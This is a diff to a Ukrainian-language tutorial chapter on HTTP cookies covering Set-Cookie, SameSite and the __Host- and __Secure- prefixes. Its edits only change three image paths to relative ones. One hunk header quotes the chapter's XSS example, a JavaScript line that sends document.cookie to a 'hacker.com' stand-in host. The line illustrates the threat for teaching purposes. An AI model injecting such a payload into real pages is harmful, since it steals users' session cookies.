@@ -35,7 +35,7 @@ Host: example.com
 Cookie: sid=k8d9f2a7bc; theme=dark
 ```
 
-![Обмін HTTP-cookie: створення сервером і автоматичне повернення браузером](/book/programming/web-backend/http-cookies/img/cookie-exchange.svg)
+![Обмін HTTP-cookie: створення сервером і автоматичне повернення браузером](img/cookie-exchange.svg)
 
 *Сервер задає директиви збереження у заголовку Set-Cookie; браузер зберігає запис у локальному сховищі й самостійно додає рядок «ім'я=значення» до кожного наступного запиту, що відповідає домену й шляху.*
 
@@ -162,7 +162,7 @@ new Image().src = "https://hacker.com/steal?c=" + encodeURIComponent(document.co
 Set-Cookie: sid=k8d9f2a7bc; Path=/; Secure; HttpOnly; SameSite=Lax
 ```
 
-![Поведінка атрибута SameSite при міжсайтових переходах](/book/programming/web-backend/http-cookies/img/samesite-modes.svg)
+![Поведінка атрибута SameSite при міжсайтових переходах](img/samesite-modes.svg)
 
 *Режим Strict блокує передачу cookie при будь-яких сторонніх переходах, Lax захищає від небезпечних фонових мутацій і POST-форм, а None вимагає шифрування Secure для роботи у сторонніх контекстах.*
 
@@ -194,7 +194,7 @@ Set-Cookie: sid=k8d9f2a7bc; Path=/; Secure; HttpOnly; SameSite=Lax
 
 Щоб раз і назавжди позбавити піддомени можливості втручатися в стан кореневого сайту, стандарт RFC 6265bis запровадив **захисні префікси імен cookie**:
 
-![Межі видимості cookie та захист префіксами __Host- і __Secure-](/book/programming/web-backend/http-cookies/img/cookie-scope-prefixes.svg)
+![Межі видимості cookie та захист префіксами __Host- і __Secure-](img/cookie-scope-prefixes.svg)
 
 *Звичайні cookie зі значенням Domain поширюються на всі піддомени й піддаються атакам підміни; захисний префікс __Host- ізолює cookie виключно на поточному хості, вимагає HTTPS і закриває вектор втручання через піддомени.*
 
